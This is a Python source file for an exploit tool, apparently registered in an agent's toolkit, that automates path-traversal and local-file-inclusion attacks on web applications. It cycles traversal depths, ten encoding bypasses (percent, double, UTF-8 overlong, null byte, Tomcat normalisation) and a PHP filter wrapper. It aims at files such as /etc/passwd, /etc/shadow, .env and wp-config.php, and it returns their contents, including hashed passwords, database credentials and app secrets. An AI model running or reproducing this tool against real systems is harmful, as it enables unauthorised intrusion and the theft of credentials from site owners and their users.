"""TOOL: lfi_read - path traversal / local file inclusion with real file read.

Depth ladders x encoding schemes x PHP filter wrappers. Fingerprints known
files (/etc/passwd, win.ini, .env, wp-config) so a 200-with-junk never counts
as a hit. Confirms which scheme actually works and returns file contents.
"""
from tools import register
from tools._exploit_lib import paced_send, apply_template, verdict

FINGERPRINTS = [
    ("/etc/passwd",  "root:x:0:0",      "unix passwd"),
    ("/etc/shadow",  "root:$",          "unix shadow (hashed creds!)"),
    ("c:\\windows\\win.ini", "[fonts]", "windows win.ini"),
    ("c:\\windows\\system32\\drivers\\etc\\hosts", "localhost", "windows hosts"),
    (".env",         "APP_KEY",         "laravel/env secrets"),
    ("wp-config.php","DB_PASSWORD",     "wordpress DB creds"),
    ("config.php",   "password",        "generic config"),
    ("/etc/hosts",   "127.0.0.1",       "unix hosts"),
]

ENCODE = [
    ("plain",      lambda p: p),
    ("double",     lambda p: p.replace("../", "....//") ),
    ("pct",        lambda p: p.replace("../", "%2e%2e%2f")),
    ("pct-double", lambda p: p.replace("../", "%252e%252e%252f")),
    ("backslash",  lambda p: p.replace("../", "..\\").replace("/", "\\")),
    ("mixed",      lambda p: p.replace("../", "..%2f")),
    ("utf8-overlong", lambda p: p.replace("../", "%c0%ae%c0%ae/")),
    ("null-byte",  lambda p: p + "%00"),
    ("tomcat-norm", lambda p: p.replace("../", "..;/")),
    ("dot-bslash", lambda p: p.replace("../", "..\\")),
]

def _depths(path, is_abs):
    """Build depth ladder for relative traversal."""
    if is_abs or path.startswith(("php://", "file://")):
        return [path]
    out = []
    for n in range(1, 9):
        out.append("../" * n + path.lstrip("./"))
    return out

@register(name="lfi_file_read",
          desc="EXPLOIT: LFI/path traversal — depth+encoding ladder with PHP filter wrappers, fingerprint-confirmed file read. Returns actual file contents.",
          params={"type": "object", "properties": {
              "url_template": {"type": "string", "description": "URL with {INJ} where the path goes"},
              "path": {"type": "string", "default": "/etc/passwd"},
              "php_filter": {"type": "boolean", "default": True, "description": "also try php://filter base64 wrapper (source disclosure)"}},
              "required": ["url_template"]},
          danger="careful")
def lfi_file_read(url_template, path="/etc/passwd", php_filter=True):
    if "{INJ}" not in url_template:
        return verdict("lfi_file_read", False, "url_template lacks {INJ} placeholder")
    is_abs = path.startswith(("/", "c:\\", "C:\\", "php://", "file://"))
    fp_expect, fp_kind = None, "unknown"
    for f, sig, kind in FINGERPRINTS:
        if f.lower() == path.lower():
            fp_expect, fp_kind = sig, kind
            break

    candidates = []
    for p in _depths(path, is_abs):
        for name, enc in ENCODE:
            candidates.append((f"{name}", enc(p)))
    if php_filter and path.endswith(".php"):
        candidates.append(("php-filter-b64", f"php://filter/convert.base64-encode/resource={path}"))

    hits, evidence = [], []
    for scheme, pay in candidates[:64]:
        st, body, dt = paced_send(apply_template(url_template, pay))
        body = body or ""
        hit = False
        note = ""
        if fp_expect and fp_expect.lower() in body.lower():
            hit, note = True, f"fingerprint '{fp_expect}' matched"
        elif "php://" in scheme and body and _is_b64(body):
            import base64 as _b
            try:
                decoded = _b.b64decode(_strip_ws(body))[:400]
                if b"<?php" in decoded:
                    hit, note = True, "php source disclosed via filter wrapper"
                    body_out = decoded.decode(errors="replace")
                    evidence.append({"scheme": scheme, "payload": pay[:120],
                                     "status": st, "content": body_out})
                    break
            except Exception:
                pass
        if hit:
            hits.append({"scheme": scheme, "payload": pay[:150], "status": st,
                         "note": note, "content": body[:600]})
            evidence.append(hits[-1])
            break

    exploitable = bool(hits)
    return verdict("lfi_file_read", exploitable,
                   (f"FILE READ confirmed ({fp_kind}, scheme={hits[0]['scheme']})"
                    if exploitable else
                    "no traversal scheme produced a fingerprint-confirmed read"),
                   evidence=evidence[:6], kind=fp_kind)


def _strip_ws(s):
    return "".join(s.split())

def _is_b64(body):
    s = _strip_ws(body[:2000])
    return len(s) > 40 and all(c.isalnum() or c in "+/=" for c in s[:120])
